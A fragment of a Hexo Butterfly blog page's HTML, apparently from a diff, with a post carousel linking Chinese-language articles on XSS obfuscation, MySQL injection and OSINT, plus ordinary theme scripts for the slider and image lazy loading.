href="post/e1e1fb64.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/8bdb3c95.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/xss1.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-11-11</span><a class="blog-slider__title" href="post/8bdb3c95.html" alt="">XSS的混淆与绕过</a><div class="blog-slider__text">本文主要介绍:对XSS混淆技术的总结</div><a class="blog-slider__button" href="post/8bdb3c95.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7544e3e7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/google.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-05</span><a class="blog-slider__title" href="post/7544e3e7.html" alt="">开源情报与搜索引擎</a><div class="blog-slider__text">本文主要介绍:使用谷歌语法搜索公开信息，利用空间测绘引擎搜索资产，使用Python脚本简单编写被动信息收集的工具</div><a class="blog-slider__button" href="post/7544e3e7.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
+    console.log('已挂载butterfly_swiper')
+    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+    }
+  var elist = 'undefined'.split(',');
+  var cpage = location.pathname;
+  var epage = 'all';
+  var flag = 0;
+
+  for (var i=0;i<elist.length;i++){
+    if (cpage.includes(elist[i])){
+      flag++;
+    }
+  }
+
+  if ((epage ==='all')&&(flag == 0)){
+    butterfly_swiper_injector_config();
+  }
+  else if (epage === cpage){
+    butterfly_swiper_injector_config();
+  }
+  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
+            window.imageLazyLoadSetting = {
+                isSPA: false,
+                preloadRatio: 1,
+                processImages: null,
+            };
+        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>
